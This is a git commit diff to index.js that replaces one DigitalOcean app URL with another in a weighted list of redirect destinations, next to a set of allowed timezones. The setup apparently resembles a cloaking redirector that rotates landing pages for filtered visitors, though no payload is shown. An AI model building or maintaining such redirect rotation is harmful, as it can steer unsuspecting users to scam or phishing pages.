ffc87b2db08032cebccc67514968d32e22f06b36
paalakash <palaksh452@gmail.com>
2026-07-03 08:37:17 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://plankton-app-5453a.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://squid-app-trjzp.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
